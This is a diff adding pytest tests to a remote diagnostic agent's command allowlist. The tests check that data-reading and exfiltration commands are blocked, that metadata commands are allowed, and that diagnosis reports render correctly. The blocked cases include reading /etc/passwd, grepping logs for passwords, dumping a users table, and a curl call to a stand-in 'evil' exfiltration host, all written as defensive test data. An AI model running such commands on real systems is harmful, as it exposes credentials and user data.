@@ -207,3 +207,66 @@ def test_emitter_shows_actual_command_run():
     assert "4.2G hostd.log" in msg
     # 3. command to run — concrete remediation
     assert "sudo truncate -s 0 /var/log/x.log" in msg
+
+
+# ── security: INV_NO_DATA_EXFIL ──────────────────────────────────────────────
+
+@pytest.mark.parametrize("cmd,args", [
+    ("cat", ["/etc/passwd"]),
+    ("grep", ["password", "/var/log/app.log"]),
+    ("tail", ["-n", "100", "/var/log/payments.log"]),
+    ("mysql", ["-e", "SELECT * FROM users"]),
+    ("strings", ["/var/lib/secret.db"]),
+    ("curl", ["http://evil/exfil"]),
+])
+def test_content_read_commands_blocked(cmd, args):
+    from remote_agent.command_executor import _is_command_allowed
+    allowed, reason = _is_command_allowed(cmd, args)
+    assert not allowed
+    assert "data_exfil_blocked" in reason or "find_dangerous" in reason
+
+
+@pytest.mark.parametrize("cmd,args", [
+    ("ls", ["-lS", "/var/log"]),
+    ("du", ["-sh", "/var/log"]),
+    ("df", ["-h", "/var"]),
+    ("systemctl", ["status", "mysql"]),
+    ("journalctl", ["--disk-usage"]),
+    ("free", ["-h"]),
+])
+def test_metadata_commands_allowed(cmd, args):
+    from remote_agent.command_executor import _is_command_allowed
+    allowed, reason = _is_command_allowed(cmd, args)
+    assert allowed, reason
+
+
+def test_find_exec_blocked():
+    from remote_agent.command_executor import _is_command_allowed
+    allowed, reason = _is_command_allowed("find", ["/var/tmp", "-mtime", "+7", "-delete"])
+    assert not allowed
+    assert "find_dangerous_flag_blocked" in reason
+
+
+# ── system-thinking: blast_radius rendered ───────────────────────────────────
+
+def test_emitter_renders_blast_radius():
+    session = {
+        "trace_id": "t3", "agent_id": "uat-proxysql", "probe": "disk_usage",
+        "lane": "SYS_HARD_FAIL", "alert_hint": "disk",
+        "final": {"root_cause": "rc", "confidence": 0.8, "affected_components": ["/var"],
+                  "blast_radius": "proxysql + 2 downstream APIs lose query routing if /var fills",
+                  "remediation_steps": ["x"]},
+        "turns": [{"turn": 1, "hypothesis": "h", "command_results": []}],
+    }
+    msg = em.render_diagnosis_session(session)
+    assert "Lan toả hệ thống" in msg
+    assert "downstream APIs" in msg
+
+
+def test_preview_shows_head_and_tail_regardless_of_sort():
+    """ls -lrS (smallest first) still surfaces the biggest file (last line)."""
+    stdout = "total 100\n" + "\n".join(f"-rw- {i}K file{i}.log" for i in range(1, 11)) + "\n-rw- 9999M huge.log"
+    preview = em._preview_output(stdout)
+    assert "huge.log" in preview  # tail preserved
+    assert "total 100" in preview  # head preserved
+    assert "dòng) …" in preview
